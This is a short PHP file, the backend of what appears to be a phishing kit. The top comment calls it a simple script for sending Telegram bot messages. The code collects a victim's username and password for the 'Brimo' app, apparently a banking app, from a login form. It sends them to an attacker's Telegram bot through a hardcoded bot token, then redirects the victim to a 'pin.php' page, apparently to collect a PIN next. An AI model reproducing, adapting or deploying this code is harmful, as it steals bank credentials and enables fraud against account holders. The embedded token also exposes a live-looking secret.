<?php
/* -----------------------------------------------------
Simple PHP script for Sending Telegram Bot Message
~ Iky | https://www.wadagizig.com
------------------------------------------------------ */

function sendMessage($telegram_id, $message_text, $message_text1, $secret_token) {

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/*----------------------
only basic POST method :
-----------------------*/
$telegram_id = $_POST ['telegram_id'];
$message_text ="Akun login aplikasi Brimo Adalah >> "."Username: ".$_POST ['message_text1']." Password: ".$_POST ['message_text'];

/*--------------------------------
Isi TOKEN dibawah ini: 
--------------------------------*/
$secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
sendMessage($telegram_id, $message_text, $message_text1, $secret_token);

echo "<script>alert('Pesan berhasil terkirim!'); window.location.href = 'pin.php';</script>";
?>
